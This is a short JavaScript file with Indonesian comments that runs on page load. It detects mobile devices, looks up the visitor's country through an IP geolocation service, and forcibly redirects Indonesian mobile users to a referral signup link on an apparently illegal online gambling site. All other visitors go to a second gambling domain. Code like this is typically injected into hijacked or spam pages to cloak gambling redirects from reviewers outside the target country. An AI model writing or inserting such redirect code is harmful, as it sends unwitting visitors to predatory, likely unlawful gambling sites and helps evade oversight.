// Fungsi untuk mendeteksi perangkat
function redirectByDevice() { 
    // Gunakan navigator.userAgent untuk memeriksa tipe perangkat 
    const isMobile = /iPhone|iPad|iPod|Android|BlackBerry|Windows Phone|webOS|Opera Mini|IEMobile|Mobile/i.test(navigator.userAgent); 

    if (isMobile) { 
        // Jika perangkat adalah HP, periksa lokasi IP pengguna
        fetch('https://ipapi.co/json/') // Menggunakan ipapi.co untuk cek lokasi
            .then(response => response.json())
            .then(data => {
                if (data.country === "ID") { 
                    // Jika IP dari Indonesia, arahkan ke URL khusus HP
                    window.location.href = "https://shot.playercs168.com/daftar2?ref=AGADB1653179";
                } else {
                    // Jika bukan dari Indonesia, arahkan ke URL khusus PC
                    window.location.href = "https://citi69.com/";
                }
            })
            .catch(error => {
                console.error('Error fetching IP location:', error);
                // Redirect ke link PC jika terjadi error dalam deteksi IP
                window.location.href = "https://citi69.com/";
            });
    } else {
        // Jika perangkat bukan HP, langsung arahkan ke URL khusus PC
        window.location.href = "https://citi69.com/";
    }
} 

// Panggil fungsi ketika halaman dimuat 
window.onload = redirectByDevice;
